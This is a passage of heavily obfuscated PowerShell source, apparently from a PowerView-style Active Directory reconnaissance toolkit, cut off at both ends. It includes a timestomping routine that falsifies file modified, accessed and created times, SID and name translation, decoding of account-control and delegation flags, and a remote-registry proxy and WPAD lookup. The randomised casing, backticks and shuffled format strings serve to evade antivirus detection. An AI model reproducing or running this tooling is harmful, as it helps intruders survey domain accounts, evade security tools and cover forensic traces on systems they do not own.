    ${fi`le`InfO`o`BJecT} = (&("{0}{1}"-f 'Get-','Item') -Path ${f`ILEp`Ath})

    if (${PSBouN`dp`ARAM`e`T`ERS}[("{2}{1}{0}" -f'ibutes','ttr','AllMacA')]) {
        ${mod`IF`iEd} = ${Al`LMAC`A`TTRI`B`UTES}
        ${aC`ces`SEd} = ${A`lLmAcatt`RiB`UT`es}
        ${C`REAteD} = ${AllM`AcA`TT`RI`BU`TES}
    }

    if (${P`sBo`UN`DpaRaMETerS}[("{0}{3}{1}{2}"-f'Old','i','lePath','F')]) {
        ${cOp`Y`FILE`maC} = (&("{3}{0}{1}{2}" -f'et-MacA','t','tribute','G') ${oLd`Fi`leP`Ath})
        ${m`oDiF`Ied} = ${C`oP`yFiLeM`Ac}."mo`D`iFIeD"
        ${A`CCEs`SeD} = ${C`op`y`FiLemaC}."AC`Ce`sseD"
        ${C`RE`ATEd} = ${copYFIl`E`m`Ac}."CR`eatED"
    }

    if (${Mo`D`If`ied}) {${FIL`Ei`NFOobj`Ect}."lA`st`w`RiTeTImE" = ${MoD`IFi`ed}}
    if (${ACCE`sseD}) {${FI`LEINFO`Ob`Je`ct}."LastacC`E`SS`Time" = ${AC`ce`ssed}}
    if (${CreA`TeD}) {${Fi`lEInf`oO`BJe`CT}."c`ReAtion`TI`me" = ${cRe`A`TEd}}

    Return (&("{0}{3}{2}{4}{1}" -f 'Get-M','te','Attr','ac','ibu') ${fi`l`epaTh})
}


function c`Op`Y-`clon`Edfile {


    param(
        [Parameter(mAnDaToRY = ${t`RuE})]
        [String]
        [ValidateNotNullOrEmpty()]
        ${S`Ou`R`cEfIlE},

        [Parameter(mANDATOry = ${tr`UE})]
        [String]
        [ValidateNotNullOrEmpty()]
        ${De`stFI`Le}
    )

    
    &("{3}{4}{0}{2}{1}"-f 'MacAttrib','e','ut','Se','t-') -FilePath ${S`OUrc`Ef`IlE} -OldFilePath ${destfI`Le}

    
    &("{2}{3}{1}{0}"-f'em','-It','Cop','y') -Path ${soU`RcEf`IlE} -Destination ${D`EsTFILe}
}


function Ge`T-i`p`ADdrEsS {


    [CmdletBinding()]
    param(
        [Parameter(posITioN=0,vaLuefroMPIpELinE=${Tr`Ue})]
        [Alias({"{2}{0}{1}"-f'stNa','me','Ho'})]
        [String]
        ${cOm`Pu`TerNAme} = ''
    )
    process {
        try {
            
            ${re`S`UlTs} = @((  ${5`7c}::("{0}{2}{3}{1}"-f'G','ostEntry','et','H').Invoke(${c`O`MpUTe`R`NAmE}))."A`dDrESs`lISt")

            if (${rE`SuL`Ts}."cou`NT" -ne 0) {
                ForEach (${r`esU`Lt} in ${R`ESU`LTS}) {
                    
                    if (${REs`U`lt}."Ad`drESSF`Ami`LY" -eq ("{2}{1}{3}{0}"-f 'ork','ter','In','Netw')) {
                        ${r`e`sUlt}."I`P`A`DDRe`ssTostRI`Ng"
                    }
                }
            }
        }
        catch {
            &("{0}{3}{2}{1}" -f 'Wr','-Verbose','te','i') -Message ("{3}{7}{1}{0}{6}{4}{2}{5}" -f've host ','ld not resol','IP Addre','C',' ','ss.','to an','ou')
        }
    }
    end {}
}


function Co`NV`erT-`NAMetO`SID {

    [CmdletBinding()]
    param(
        [Parameter(mANDATorY=${t`RuE},valUefROMPiPELine=${TR`UE})]
        [String]
        [Alias({"{0}{1}" -f'N','ame'})]
        ${obj`eCt`NaME},

        [String]
        ${DoM`AIn} = (&("{0}{2}{1}" -f'Get','tDomain','-Ne'))."N`AME"
    )

    process {
        
        ${OBjeC`TNa`me} = ${o`Bj`ECtName} -replace "/","\"
        
        if(${ob`je`C`TnaMe}.("{2}{1}{0}"-f's','ntain','co').Invoke("\")) {
            
            ${DO`maIn} = ${oB`jE`CtnAmE}.("{1}{0}" -f'plit','s').Invoke("\")[0]
            ${o`BJe`CtNaME} = ${oB`je`ctn`AMe}.("{1}{0}"-f't','spli').Invoke("\")[1]
        }

        try {
            ${o`BJ} = (&("{0}{1}{2}" -f 'New-Ob','jec','t') ("{8}{7}{9}{5}{3}{0}{1}{6}{4}{2}" -f 'TA','c','nt','pal.N','ou','nci','c','ystem.Securi','S','ty.Pri')(${do`m`Ain},${Ob`j`ECt`NAme}))
            ${o`Bj}."t`R`ANslAtE"([System.Security.Principal.SecurityIdentifier])."v`ALue"
        }
        catch {
            &("{3}{1}{0}{2}"-f 'er','V','bose','Write-') ('I'+'nval'+'id '+'ob'+'j'+'ect/name:'+' '+"$Domain\$ObjectName")
            ${Nu`ll}
        }
    }
}


function c`oNv`eR`T-SID`TONaME {

    [CmdletBinding()]
    param(
        [Parameter(MAndAtory=${t`RuE},vAlueFROMpIPeliNE=${tr`UE})]
        [String]
        ${s`id}
    )

    process {
        try {
            ${s`iD2} = ${s`ID}.("{1}{0}"-f'im','tr').Invoke('*')

            
            
            Switch (${si`d2})
            {
                ("{1}{0}"-f'0','S-1-')         { ("{2}{1}{0}" -f 'ty',' Authori','Null') }
                ("{0}{2}{1}"-f 'S-1-','-0','0')       { ("{1}{0}" -f 'dy','Nobo') }
                ("{1}{0}" -f'-1','S-1')         { ("{1}{3}{2}{0}"-f 'hority','Wo',' Aut','rld') }
                ("{0}{1}" -f 'S-','1-1-0')       { ("{0}{1}" -f'Everyo','ne') }
                ("{1}{0}" -f'1-2','S-')         { ("{2}{3}{1}{0}{4}"-f'tho',' Au','Loca','l','rity') }
                ("{0}{1}"-f'S-1-','2-0')       { ("{1}{0}"-f'ocal','L') }
                ("{1}{2}{0}" -f '1-2-1','S','-')       { ("{3}{0}{4}{1}{2}" -f 'o','e Logo','n ','Cons','l') }
                ("{0}{1}"-f'S-1','-3')         { ("{0}{4}{2}{1}{3}"-f 'Cr','t','ori','y','eator Auth') }
                ("{1}{2}{0}" -f'3-0','S-','1-')       { ("{0}{2}{1}" -f 'Cr','er','eator Own') }
                ("{0}{1}"-f'S-1-3','-1')       { ("{2}{1}{0}{3}"-f 'r','ator G','Cre','oup') }
                ("{2}{1}{0}"-f'2','-','S-1-3')       { ("{5}{3}{2}{0}{1}{4}" -f 'Owner Se','rv','r ','to','er','Crea') }
                ("{1}{2}{0}"-f'3','S-1-3','-')       { ("{4}{2}{0}{3}{1}"-f'oup','r','ator Gr',' Serve','Cre') }
                ("{0}{1}"-f'S-1-3','-4')       { ("{2}{3}{1}{0}"-f'ts','gh','Ow','ner Ri') }
                ("{1}{0}" -f'4','S-1-')         { ("{3}{6}{5}{0}{4}{2}{1}" -f'e Aut','y','rit','Non-u','ho','iqu','n') }
                ("{1}{0}"-f '5','S-1-')         { ("{2}{0}{1}{3}" -f'T Author','it','N','y') }
                ("{0}{2}{1}"-f 'S-','-1','1-5')       { ("{0}{1}" -f'D','ialup') }
                ("{1}{0}" -f '-1-5-2','S')       { ("{2}{0}{1}" -f 'et','work','N') }
                ("{2}{1}{0}" -f'-3','1-5','S-')       { ("{1}{0}"-f'h','Batc') }
                ("{1}{0}"-f '4','S-1-5-')       { ("{2}{0}{3}{1}"-f 'nte','ctive','I','ra') }
                ("{2}{1}{0}"-f'5-6','1-','S-')       { ("{2}{0}{1}"-f 'rvi','ce','Se') }
                ("{0}{2}{1}" -f 'S','7','-1-5-')       { ("{0}{1}{2}"-f'An','onymou','s') }
                ("{0}{1}" -f 'S-','1-5-8')       { ("{1}{0}" -f 'oxy','Pr') }
                ("{1}{0}"-f '-1-5-9','S')       { ("{4}{1}{0}{7}{2}{5}{6}{3}"-f'r','erp','ma','lers','Ent','in C','ontrol','ise Do') }
                ("{2}{0}{1}" -f'-1','-5-10','S')      { ("{0}{1}{2}{3}{4}"-f 'Pri','nc','i','pal Se','lf') }
                ("{0}{1}" -f 'S-1-','5-11')      { ("{4}{0}{1}{3}{5}{2}"-f 'u','thent','d Users','ic','A','ate') }
                ("{0}{2}{1}"-f 'S-','-12','1-5')      { ("{1}{0}{2}{3}{4}" -f 'cted','Restri',' ','Cod','e') }
                ("{2}{1}{0}"-f '13','-1-5-','S')      { ("{2}{1}{5}{6}{0}{3}{4}" -f'er','inal','Term',' Use','rs',' Ser','v') }
                ("{1}{0}{2}"-f'-5-1','S-1','4')      { ("{5}{3}{6}{2}{1}{4}{0}" -f 'n','ive','act','te Int',' Logo','Remo','er') }
                ("{2}{0}{1}" -f'-5-1','5','S-1')      { ("{4}{3}{0}{5}{1}{2}"-f 's Or','io','n ','i','Th','ganizat') }
                ("{1}{0}{2}" -f'1-5-','S-','17')      { ("{3}{2}{1}{0}" -f ' ','anization','his Org','T') }
                ("{0}{1}{2}" -f'S-','1-','5-18')      { ("{0}{1}{2}" -f 'Local ','Sys','tem') }
                ("{1}{2}{0}"-f'19','S-1-5','-')      { ("{1}{0}{2}"-f 'uthori','NT A','ty') }
                ("{1}{0}" -f '0','S-1-5-2')      { ("{0}{1}{2}"-f'NT ','Author','ity') }
                ("{0}{2}{1}"-f 'S-1-5-8','0','0-')    { ("{2}{1}{3}{0}"-f ' ','rv','All Se','ices') }
                ("{3}{1}{0}{2}"-f'5','-1-','-32-544','S')  { ((("{5}{3}{0}{2}{4}{1}"-f 'str','s','at','UILTINLf3Admini','or','B')).("{1}{0}" -f 'ce','rePla').Invoke('Lf3','\')) }
                ("{1}{3}{0}{2}"-f '-','S-1-','545','5-32')  { ((("{3}{1}{2}{0}"-f'rs','UILTIN0roU','se','B')).("{0}{2}{1}" -f 'rEPL','ce','a').Invoke('0ro','\')) }
                ("{2}{0}{1}" -f'32-','546','S-1-5-')  { ((("{4}{3}{1}{2}{0}" -f's','G','uest','IN2Qi','BUILT'))."r`ePL`Ace"(([chAR]50+[chAR]81+[chAR]105),[STRING][chAR]92)) }
                ("{0}{1}{2}"-f 'S-1-5-32-','5','47')  { ((("{0}{2}{3}{4}{1}" -f'BUIL','rs','T','I','NqMuPower Use')) -cRepLAcE  ([ChAR]113+[ChAR]77+[ChAR]117),[ChAR]92) }
                ("{3}{0}{2}{1}" -f '5-32','48','-5','S-1-')  { ((("{1}{2}{5}{0}{3}{7}{8}{6}{4}" -f 'I','BUI','L','NkjF','s','T','or','Account Ope','rat'))-rEPLaCE  'kjF',[CHAR]92) }
                ("{1}{2}{0}{3}"-f'5','S-1','-','-32-549')  { ((("{2}{6}{4}{1}{0}{5}{3}" -f'e','}S','B','ators','{0','rver Oper','UILTIN'))  -f [CHaR]92) }
                ("{2}{1}{0}" -f'-550','-1-5-32','S')  { ((("{2}{1}{0}{3}{4}"-f'O','UILTINKnWPrint ','B','per','ators'))."reP`Lace"('KnW',[StRinG][chaR]92)) }
                ("{2}{1}{0}{3}"-f'5','-1-','S','-32-551')  { ((("{1}{3}{4}{5}{2}{0}" -f 'ors','BUILT','erat','IN','{0','}Backup Op')) -f [Char]92) }
                ("{0}{1}{3}{2}"-f 'S-1-5','-','2-552','3')  { ((("{0}{2}{3}{1}" -f 'BUILTINC','Replicators','K','w'))."r`epLaCE"(([cHAr]67+[cHAr]75+[cHAr]119),[stRINg][cHAr]92)) }
                ("{3}{2}{1}{0}"-f'2-554','5-3','-','S-1')  { ((("{2}{9}{3}{10}{1}{0}{8}{6}{5}{11}{4}{7}"-f '00 Compa',' 20','BUI','INm5CP','e','le Ac','b','ss','ti','LT','re-Windows','c'))-REplaCE'm5C',[cHar]92) }
                ("{0}{2}{1}{3}"-f 'S','1-5-3','-','2-555')  { ((("{6}{5}{0}{2}{1}{3}{4}{7}" -f 'NC','e','BwRemote D','skt','op Use','ILTI','BU','rs'))-ReplAce ([CHAr]67+[CHAr]66+[CHAr]119),[CHAr]92) }
                ("{1}{0}{2}{3}" -f'32','S-1-5-','-5','56')  { ((("{5}{9}{7}{1}{4}{2}{0}{10}{6}{3}{8}"-f 'C','9N','ork ','uration Oper','etw','BU','nfig','NO8','ators','ILTI','o'))."rePL`A`ce"(([chaR]79+[chaR]56+[chaR]57),[sTRINg][chaR]92)) }
                ("{1}{0}{3}{2}"-f '5-32','S-1-','557','-')  { ((("{6}{4}{2}{8}{3}{7}{10}{0}{1}{5}{9}"-f'Trust B','ui','LTINF5','nco','I','l','BU','ming Fore','yI','ders','st '))."Re`PLacE"(([chAR]70+[chAR]53+[chAR]121),[strinG][chAR]92)) }
                ("{1}{0}{2}" -f '2-5','S-1-5-3','58')  { ((("{7}{2}{1}{3}{0}{9}{5}{6}{4}{8}" -f'rma','r','35Pe','fo','r U','e Mon','ito','BUILTINQ','sers','nc'))  -CREpLacE([char]81+[char]51+[char]53),[char]92) }
                ("{1}{2}{3}{0}"-f '559','S-','1-5-3','2-')  { ((("{3}{0}{5}{1}{4}{7}{6}{2}"-f'U','7Pe','Log Users','B','rf','ILTINWd','mance ','or')) -rEPlACe'Wd7',[CHar]92) }
                ("{1}{2}{0}"-f '5-32-560','S-1','-')  { ((("{5}{0}{1}{7}{3}{2}{8}{4}{6}" -f 'horiz','at',' G',' Access','ou','BUILTINoqHWindows Aut','p','ion','r')) -CREPLAcE  'oqH',[cHaR]92) }
                ("{2}{1}{0}"-f '32-561','-','S-1-5')  { ((("{7}{4}{3}{0}{1}{5}{6}{2}" -f 'r Li','c','s','nal Serve','Termi','ense Se','rver','BUILTINUTn'))-rePLaCE  ([cHAr]85+[cHAr]84+[cHAr]110),[cHAr]92) }
                ("{0}{1}{3}{2}"-f 'S-','1-','2-562','5-3')  { ((("{7}{4}{1}{5}{2}{3}{6}{0}"-f'M Users','str','u','te','INHVfDi','ib','d CO','BUILT'))."Re`Pla`cE"(([Char]72+[Char]86+[Char]102),'\')) }
                ("{1}{3}{2}{0}" -f'569','S','1-5-32-','-')  { ((("{5}{2}{3}{4}{6}{0}{1}"-f'phic Operator','s','ILTIN','{0}Crypt','o','BU','gra'))  -F [cHAr]92) }
                ("{3}{0}{1}{2}" -f '-1','-5-32-5','73','S')  { ((("{2}{7}{5}{0}{8}{4}{6}{3}{1}" -f'pdEvent Log R','rs','BU','e','a','N2','d','ILTI','e'))."REpL`AcE"(([ChaR]50+[ChaR]112+[ChaR]100),[STrINg][ChaR]92)) }
                ("{2}{1}{0}{3}"-f '-5','-1','S','-32-574')  { ((("{6}{5}{2}{4}{1}{0}{7}{3}" -f' Acc','M','icate','ss',' Service DCO','if','BUILTINBXUCert','e'))."R`epl`Ace"(([chAr]66+[chAr]88+[chAr]85),'\')) }
                ("{1}{0}{2}{3}" -f '-','S','1-5','-32-575')  { ((("{2}{6}{1}{5}{3}{0}{7}{4}{8}" -f 'QRDS ','I','BUI','m','erver','N4','LT','Remote Access S','s')).("{1}{0}{2}"-f 'p','rE','lACe').Invoke('4mQ','\')) }
                ("{1}{2}{0}" -f'576','S-','1-5-32-')  { ((("{5}{2}{7}{3}{1}{0}{6}{4}"-f' Serve','t','TINor','S Endpoin','s','BUIL','r','SRD')) -crePlAcE  'orS',[chAR]92) }
                ("{1}{0}{3}{2}"-f'-1-5-32','S','77','-5')  { ((("{5}{1}{0}{2}{6}{3}{4}{7}{8}" -f'D','UILTINHvMR','S M','ent',' Se','B','anagem','rv','ers')).("{0}{1}{2}"-f 'RepL','a','ce').Invoke('HvM','\')) }
                ("{2}{1}{0}"-f '78','-5-32-5','S-1')  { ((("{2}{5}{4}{0}{6}{1}{3}" -f '{0}Hype','dministrat','BUI','ors','N','LTI','r-V A'))  -F[cHar]92) }
                ("{0}{2}{1}{3}" -f'S-1-','32-57','5-','9')  { ((("{9}{5}{6}{8}{4}{7}{2}{3}{1}{10}{0}"-f'ators','ance O','sis','t','0}Access','UIL','TIN',' Control As','{','B','per'))-F  [char]92) }
                ("{3}{0}{2}{1}"-f '-32-','0','58','S-1-5')  { ((("{5}{11}{4}{13}{10}{2}{8}{1}{9}{6}{3}{14}{7}{0}{12}"-f 'tor','C','ess','nce Ope','q','BU','ssista','a',' ','ontrol A','cc','ILTINX','s','MA','r'))  -RePLAcE 'XqM',[CHAr]92) }
                ("{0}{1}"-f'Def','ault') { 
                    ${O`Bj} = (&("{2}{0}{1}" -f 'w-Obj','ect','Ne') ("{0}{4}{5}{3}{6}{10}{8}{7}{1}{2}{9}"-f'S','den','tifi','ty.Pri','ystem.Se','curi','ncipa','ityI','cur','er','l.Se')(${s`ID2}))
                    ${O`BJ}."T`Rans`lAtE"( [System.Security.Principal.NTAccount])."V`ALUe"
                }
            }
        }
        catch {
            
            ${S`id}
        }
    }
}


function COnvert-`NT`4toca`NonI`cAL {

    [CmdletBinding()]
    param(
        [Parameter(MANDatorY=${T`Rue},VALUEFrOmpIPELine=${tr`Ue})]
        [String]
        ${oBj`ec`Tn`Ame}
    )

    process {

        ${oBJe`c`Tn`Ame} = ${ob`jeC`Tn`AmE} -replace "/","\"
        
        if(${OBJEc`TN`Ame}.("{1}{0}" -f'ains','cont').Invoke("\")) {
            
            ${D`OmaIn} = ${ObJ`ECtNA`Me}.("{1}{0}" -f 'it','spl').Invoke("\")[0]
        }

        
        function InVOK`E-METh`OD([__ComObject] ${o`Bj`ECT}, [String] ${mET`HOd}, ${PAR`AMe`TE`Rs}) {
            ${out`P`Ut} = ${obJ`Ect}.("{0}{1}"-f 'GetT','ype').Invoke().("{3}{0}{1}{2}"-f'e','Me','mber','Invok').Invoke(${Met`HOD}, ("{0}{2}{1}"-f 'InvokeMet','d','ho'), ${N`UlL}, ${oBJe`ct}, ${pARa`MetE`RS})
            if ( ${o`UT`PUt} ) { ${O`UTpUt} }
        }
        function SeT`-p`ROpERtY([__ComObject] ${O`Bj`ect}, [String] ${p`RoPer`Ty}, ${Pa`R`AMete`RS}) {
            [Void] ${oB`jEcT}.("{1}{0}" -f'etType','G').Invoke().("{0}{1}{2}{3}"-f 'Invo','keM','emb','er').Invoke(${PRo`p`ERtY}, ("{0}{1}{2}"-f 'Set','Prop','erty'), ${NU`ll}, ${OBjE`ct}, ${pa`R`Am`etERs})
        }

        ${trA`Ns`LATE} = &("{2}{1}{0}"-f 'ject','b','New-O') -ComObject ("{2}{4}{3}{1}{0}" -f'e','at','Nam','Transl','e')

        try {
            &("{2}{1}{3}{0}" -f 'hod','e-M','Invok','et') ${T`R`A`NSlATE} ("{1}{0}" -f'nit','I') (1, ${D`OMAin})
        }
        catch [System.Management.Automation.MethodInvocationException] { 
            &("{0}{2}{1}"-f 'Wri','bug','te-De') ('Err'+'or '+'wi'+'th '+'trans'+'l'+'ate '+'ini'+'t '+'in'+' '+'Convert-'+'NT'+'4'+'t'+'oCanon'+'ical:'+' '+"$_")
        }

        &("{1}{0}{2}"-f'et-Pr','S','operty') ${TRA`N`sLa`Te} ("{1}{2}{0}{3}"-f'f','Cha','seRe','erral') (0x60)

        try {
            &("{0}{1}{2}{3}" -f 'I','nvoke','-Me','thod') ${Tr`An`slAte} "Set" (3, ${ObJ`eC`TnAME})
            (&("{1}{0}{2}"-f'voke-Metho','In','d') ${t`RaN`SLATE} "Get" (2))
        }
        catch [System.Management.Automation.MethodInvocationException] {
            &("{0}{2}{1}"-f 'Write-','ebug','D') ('E'+'rror'+' '+'with'+' '+'t'+'ranslat'+'e '+'Set'+'/Get'+' '+'in'+' '+'Co'+'nvert'+'-NT4to'+'Canonica'+'l: '+"$_")
        }
    }
}


function co`N`V`ERT`-cAnoNICaLtON`T4 {


    [CmdletBinding()]
    param(
        [String] ${objE`cTN`A`Me}
    )

    ${Do`M`AiN} = (${Ob`JEC`TnaME} -split "@")[1]

    ${obJECT`N`AME} = ${oB`JEC`Tname} -replace "/","\"

    
    function i`Nvo`KE-`M`EthOD([__ComObject] ${OBj`eCt}, [String] ${ME`ThOD}, ${P`A`Rame`TeRs}) {
        ${O`UTPuT} = ${ob`j`eCt}.("{1}{2}{0}"-f'e','GetTy','p').Invoke().("{0}{1}{2}"-f 'Inv','okeMemb','er').Invoke(${m`eThoD}, ("{2}{1}{0}" -f 'eMethod','k','Invo'), ${n`Ull}, ${Ob`Je`cT}, ${p`A`RaM`EtErS})
        if ( ${Outp`Ut} ) { ${OuT`pUT} }
    }
    function s`ET-PrOPer`TY([__ComObject] ${Ob`jE`Ct}, [String] ${P`R`OpERtY}, ${ParA`Met`ErS}) {
        [Void] ${obJ`e`CT}.("{0}{2}{1}" -f'Get','pe','Ty').Invoke().("{2}{0}{1}{3}" -f'vokeMemb','e','In','r').Invoke(${pR`Ope`Rty}, ("{1}{2}{0}"-f'perty','SetPr','o'), ${n`Ull}, ${oB`j`ECT}, ${Pa`R`Am`eTerS})
    }

    ${t`R`ANsL`ATE} = &("{2}{0}{3}{1}" -f 'O','ect','New-','bj') -comobject ("{1}{3}{0}{2}" -f 'l','NameTr','ate','ans')

    try {
        &("{1}{0}{2}{4}{3}" -f 'v','In','oke','od','-Meth') ${TR`AnSLA`TE} ("{0}{1}"-f 'Ini','t') (1, ${Do`mA`In})
    }
    catch [System.Management.Automation.MethodInvocationException] { }

    &("{1}{2}{3}{0}" -f'rty','Se','t-P','rope') ${T`RaNslA`Te} ("{2}{1}{0}{3}" -f'Refer','hase','C','ral') (0x60)

    try {
        &("{2}{1}{0}"-f 'e-Method','vok','In') ${Tr`A`NSlATe} "Set" (5, ${obJ`ec`TnA`me})
        (&("{1}{2}{0}"-f 'thod','Invoke-','Me') ${tR`A`NsLATE} "Get" (3))
    }
    catch [System.Management.Automation.MethodInvocationException] { ${_} }
}


function c`oNVe`Rt`FrOM-UAc`V`A`LUE {

    
    [CmdletBinding()]
    param(
        [Parameter(ValUeFROMPiPeLiNe=${T`Rue})]
        ${V`A`lue},

        [Switch]
        ${s`h`owalL}
    )

    begin {

        
        ${u`AcvA`lUeS} = &("{2}{1}{0}"-f't','jec','New-Ob') ("{3}{10}{2}{8}{6}{0}{7}{5}{1}{9}{12}{4}{11}"-f't','.Specialized','.','Syst','na','ns','ollec','io','C','.Orde','em','ry','redDictio')
        ${uaCV`AL`UEs}.("{0}{1}" -f'A','dd').Invoke(("{1}{0}{2}" -f'RI','SC','PT'), 1)
        ${u`Acv`ALUEs}.("{0}{1}" -f 'A','dd').Invoke(("{0}{2}{3}{1}{4}"-f'ACCOUNT','BL','DI','SA','E'), 2)
        ${uA`CvaLU`ES}.("{0}{1}" -f 'Ad','d').Invoke(("{1}{0}{3}{2}" -f'EDIR_','HOM','D','REQUIRE'), 8)
        ${U`ACV`AlUEs}.("{0}{1}"-f 'Ad','d').Invoke(("{0}{1}"-f'L','OCKOUT'), 16)
        ${U`Ac`VALuEs}.("{1}{0}"-f 'd','Ad').Invoke(("{3}{0}{2}{1}"-f'SSWD_NOT','QD','RE','PA'), 32)
        ${u`AcVaL`UES}.("{1}{0}" -f 'dd','A').Invoke(("{1}{3}{4}{0}{2}{5}" -f'D_C','PA','AN','SS','W','T_CHANGE'), 64)
        ${Ua`cv`ALueS}.("{1}{0}"-f'd','Ad').Invoke(("{4}{1}{3}{2}{5}{0}"-f'LLOWED','PTED_','_PWD_','TEXT','ENCRY','A'), 128)
        ${UaCvA`lU`ES}.("{0}{1}" -f 'Ad','d').Invoke(("{1}{2}{0}{5}{6}{4}{3}" -f'I','T','EMP_DUPL','_ACCOUNT','TE','C','A'), 256)
        ${UACV`ALu`Es}.("{1}{0}" -f'dd','A').Invoke(("{3}{2}{0}{1}"-f 'MAL_A','CCOUNT','OR','N'), 512)
        ${UACvA`L`Ues}.("{0}{1}"-f'A','dd').Invoke(("{1}{6}{0}{3}{4}{2}{5}"-f '_T','INTE','OUN','RUST_','ACC','T','RDOMAIN'), 2048)
        ${U`ACVa`lUeS}.("{0}{1}" -f'A','dd').Invoke(("{2}{0}{1}{3}{4}" -f 'ATION_TR','UST_','WORKST','A','CCOUNT'), 4096)
        ${uAC`Va`LuEs}.("{0}{1}"-f 'A','dd').Invoke(("{2}{5}{4}{3}{0}{1}"-f 'O','UNT','SERV','CC','RUST_A','ER_T'), 8192)
        ${u`AC`VAluEs}.("{1}{0}" -f'd','Ad').Invoke(("{5}{3}{1}{0}{2}{6}{4}" -f 'E_','XPIR','P','NT_E','ORD','DO','ASSW'), 65536)
        ${uAC`VA`LUeS}.("{1}{0}" -f'dd','A').Invoke(("{1}{4}{2}{3}{0}" -f 'NT','M','S_LOGON_ACC','OU','N'), 131072)
        ${uAc`VaLU`Es}.("{0}{1}"-f 'A','dd').Invoke(("{1}{4}{0}{2}{3}"-f 'ARD_REQUIR','SM','E','D','ARTC'), 262144)
        ${UA`cvALu`es}.("{1}{0}" -f'dd','A').Invoke(("{1}{4}{3}{0}{2}"-f 'GAT','TRUS','ION','ED_FOR_DELE','T'), 524288)
        ${U`ACVAL`UES}.("{1}{0}" -f 'dd','A').Invoke(("{1}{3}{2}{0}{4}" -f'TE','NOT_','A','DELEG','D'), 1048576)
        ${U`AcV`AlueS}.("{0}{1}"-f'Ad','d').Invoke(("{0}{2}{3}{1}"-f 'USE_DE','ONLY','S_KE','Y_'), 2097152)
        ${Uac`ValU`eS}.("{1}{0}"-f 'dd','A').Invoke(("{4}{0}{3}{2}{1}" -f'Q_','TH','EAU','PR','DONT_RE'), 4194304)
        ${ua`CV`ALuES}.("{1}{0}"-f'dd','A').Invoke(("{2}{3}{1}{4}{0}"-f'ED','R','PA','SSWO','D_EXPIR'), 8388608)
        ${u`Acva`luES}.("{1}{0}"-f'dd','A').Invoke(("{8}{6}{7}{2}{1}{3}{4}{5}{0}" -f'ATION','AUTH_','_','F','OR_D','ELEG','ST','ED_TO','TRU'), 16777216)
        ${u`ACvAL`UEs}.("{0}{1}" -f 'Ad','d').Invoke(("{4}{1}{5}{0}{3}{6}{2}" -f'TS','ARTIA','T','_ACCOU','P','L_SECRE','N'), 67108864)

    }

    process {

        ${R`eSultua`cVAL`UEs} = &("{0}{2}{3}{1}" -f 'Ne','ct','w-Ob','je') ("{8}{1}{4}{9}{7}{12}{6}{2}{13}{3}{10}{14}{0}{5}{11}"-f 't','t','Sp','Order','em.Colle','io','.','tio','Sys','c','ed','nary','ns','ecialized.','Dic')

        if(${v`ALUe} -is [Int]) {
            ${Int`Value} = ${VA`luE}
        }

        if (${va`l`Ue} -is [PSCustomObject]) {
            if(${VAl`UE}."USeRa`CCOU`NTc`O`NTROl") {
                ${In`TvALUe} = ${Va`LUE}."Us`E`RAC`c`OUNtCO`NtROl"
            }
        }

        if(${iNtv`AL`UE}) {

            if(${shO`Wall}) {
                foreach (${U`A`CvaLUE} in ${u`AcValU`es}.("{2}{0}{3}{1}" -f 'Enum','rator','Get','e').Invoke()) {
                    if( (${iN`TvAL`UE} -band ${UACv`A`lue}."VA`lue") -eq ${U`Ac`ValUe}."VA`lUe") {
                        ${ResultUA`c`Va`LuES}.("{0}{1}" -f'Ad','d').Invoke(${Ua`cV`ALUe}."n`AmE", "$($UACValue.Value)+")
                    }
                    else {
                        ${RESulTu`A`Cva`Lues}.("{1}{0}" -f'dd','A').Invoke(${U`Ac`ValuE}."nA`mE", "$($UACValue.Value)")
                    }
                }
            }
            else {
                foreach (${Ua`cvA`lUE} in ${U`AcvA`l`UeS}.("{2}{3}{0}{1}"-f 'a','tor','GetEn','umer').Invoke()) {
                    if( (${I`NTVA`L`UE} -band ${U`ACvA`LUE}."Va`Lue") -eq ${uA`CV`ALUe}."V`AlUe") {
                        ${rEsult`UAc`Va`LueS}.("{0}{1}" -f'A','dd').Invoke(${U`AC`VaLue}."nA`ME", "$($UACValue.Value)")
                    }
                }                
            }
        }

        ${R`esu`LtUA`CvALueS}
    }
}


function g`eT-pROXy {

    param(
        [Parameter(ValUeFrOMPiPelinE=${tR`Ue})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${COM`pUte`Rn`Ame} = ${EN`V:COmPU`T`e`RnaME}
    )

    process {
        try {
            ${R`eg} =   (&("{2}{1}{0}"-f'lE','IAb','vAr') ('9'+'2m')  -vaLUe )::("{2}{4}{0}{5}{3}{1}"-f'e','oteBaseKey','O','m','p','nRe').Invoke(("{1}{3}{0}{2}"-f 'ntUs','Curr','er','e'), ${c`oMPUtER`Na`ME})
            ${r`Eg`Key} = ${R`EG}.("{0}{2}{1}"-f'Ope','key','nSub').Invoke(((("{2}{6}{11}{13}{14}{15}{12}{16}{5}{1}{9}{17}{4}{7}{10}{0}{3}{8}" -f 'etti','aFsC','SOF','ng','rsionaFsaFs','wsaFs','T','Internet ','s','ur','S','WAR','oftaFsaFsWi','EaFsaFsMic','r','os','ndo','rentVe')) -rePlAcE ([cHar]97+[cHar]70+[cHar]115),[cHar]92))
            ${p`Ro`XYS`ervEr} = ${re`Gk`ey}.("{2}{1}{0}"-f'ue','l','GetVa').Invoke(("{3}{0}{2}{1}" -f'rox','ver','ySer','P'))
            ${auTO`COnF`igu`Rl} = ${rE`gkey}.("{1}{0}" -f 'lue','GetVa').Invoke(("{1}{2}{3}{0}" -f'gURL','Au','toConf','i'))

            if(${aUtOCOnf`Ig`URl} -and (${A`Ut`OCO`NfiGu`RL} -ne "")) {
                try {
                    ${Wp`AD} = (&("{0}{1}{2}"-f'New-','Objec','t') ("{0}{1}{2}{3}" -f'N','e','t.Webcli','ent')).("{3}{2}{1}{0}"-f 'ring','loadSt','wn','Do').Invoke(${a`UtOC`oNFI`gUrl})
                }
                catch {
                    ${WP`Ad} = ""
                }
            }
            else {
                ${w`pAd} = ""
            }
            
            if(${p`ROxys`ERVeR} -or ${Aut`O`confiGU`Rl}) {

                ${p`RO`pErT`iES} = @{
                    ("{1}{2}{0}" -f 'ver','ProxySe','r') = ${pRoXYse`R`VER}
                    ("{2}{0}{3}{1}" -f 't','nfigURL','Au','oCo') = ${AUTOco`N`FI`gU`RL}
                    ("{0}{1}"-f 'Wp','ad') = ${w`PAd}
                }
                
                &("{1}{0}{3}{2}"-f'e','N','t','w-Objec') -TypeName ("{1}{2}{0}" -f 't','PSOb','jec') -Property ${pROp`ERT`i`es}
            }
            else {
